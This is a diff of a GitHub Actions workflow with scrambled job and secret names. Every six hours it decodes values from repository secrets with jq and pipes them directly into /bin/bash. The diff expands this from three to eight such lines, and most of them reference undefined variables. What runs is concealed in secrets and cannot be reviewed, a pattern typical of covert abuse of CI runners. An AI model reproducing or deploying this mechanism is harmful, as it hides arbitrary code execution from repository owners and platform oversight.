@@ -1,19 +1,24 @@
 name: maoziran6798
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 0/6 * * *'
+    - cron: '46 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: maoziran6798
         env:
-          gskm4609: ${{ secrets.gskm4609 }}
+          zofem041: ${{ secrets.zofem041 }}
         run: |
-          echo $gskm4609 | jq -r .x7 | /bin/bash
-          echo $yfd4 | jq -r .vu5 | /bin/bash
-          echo $fg64 | jq -r .suwo0 | /bin/bash
+          echo $zofem041 | jq -r .lh18 | /bin/bash
+          echo $xrb319 | jq -r .bwto6 | /bin/bash
+          echo $cokn0 | jq -r .sleji45150 | /bin/bash
+          echo $f5 | jq -r .oc91820 | /bin/bash
+          echo $it59263 | jq -r .p989 | /bin/bash
+          echo $ijo398 | jq -r .fdctj1870 | /bin/bash
+          echo $ud7557 | jq -r .giail644 | /bin/bash
+          echo $zy7 | jq -r .qqno99522 | /bin/bash
 
